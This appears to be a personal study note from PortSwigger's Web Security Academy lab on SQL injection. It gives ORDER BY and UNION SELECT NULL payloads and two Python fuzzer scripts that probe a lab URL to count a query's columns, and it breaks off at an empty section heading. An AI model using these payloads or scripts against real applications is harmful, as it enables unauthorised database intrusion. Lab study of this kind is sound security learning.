# SQL Injection:

## 1. Determining number of columns return from a query:
### Using ORDER BY statement:
```sql
' ORDER BY 1--
# We can keep on increasing the number i.e. currently 1 until the server throws an error.
```
-> A simple python fuzzer that would keep on increasing the number until the response gets in the range of 500+:
```python
#!/usr/bin/env python3

import requests

main_url = "https://acfb1f101ebee2aa80ce2a3c002100e2.web-security-academy.net/filter?category="

NUM = 1
while True:
	url = main_url
	payload = f"' ORDER BY {NUM} --"
	url += payload
	print(f"[*] Fuzzing with payload : {payload}", end = '')
	r = requests.get(url)
	print(f" : -> {r.status_code}")
	if r.status_code >= 500:
		break
	NUM += 1
	
print(f"\n[+] Payload : ' ORDER BY {NUM - 1} --")
print(f"[+] Number of columns returned : {NUM - 1}")
```

### Using null queries:
```sql
' UNION SELECT NULL --
# As long as some error occurs or when an error occurs, that would determine the number of tables existing in the database
```
-> A simple python fuzzer that would keep on fuzzing until the server gives a response besides 500:

```python
#!/usr/bin/env python3

import requests

main_url = "https://acfb1f101ebee2aa80ce2a3c002100e2.web-security-academy.net/filter?category="

NULL = 'NULL'
while True:
	url = main_url
	payload = f"' UNION SELECT {NULL} --"
	url += payload
	print(f"[*] Fuzzing with payload : {payload}", end = '')
	r = requests.get(url)
	print(f" : -> {r.status_code}")
	if r.status_code != 500:
		break
	NULL += ',NULL'

print(f"\n[+] Payload : {payload}\n[+] Number of columns returned: {len(payload.split(','))}")
```
-> Output from Portswigger UNION lab:
![[Pasted image 20210818152140.png]]

#### Note:
-   The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.

## 2. 